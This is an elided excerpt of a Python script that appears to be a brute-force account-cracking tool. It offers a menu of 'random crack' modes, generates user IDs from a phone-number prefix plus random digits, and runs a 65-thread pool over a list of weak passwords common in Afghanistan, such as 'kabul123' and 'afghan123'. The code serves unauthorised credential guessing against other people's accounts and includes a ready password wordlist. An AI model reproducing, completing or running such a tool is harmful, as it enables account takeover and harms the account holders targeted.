...
def menu():
	...
	print('[2] START RANDOM CARACK M [2]FORM RAZIQ ULLAH') 
	print('[3] START RANDOM CARACK M [3]FORM AFG Saadat') 
	print('[4] START RANDOM CARACK M [4]FORM RAZIQ') 
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9378,9370,9379,9376.ETC')
	print('[+]═══════════════════════════════════════════')
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'afghan123','khan123','۱۲۳۴۵۶','kabul123','kabul1234','500600','afghanistan','123456','kabul12345','786786','10002000','khan123','۱۲۳۴۵۶۷۸۹','khost123','afghanistan123']
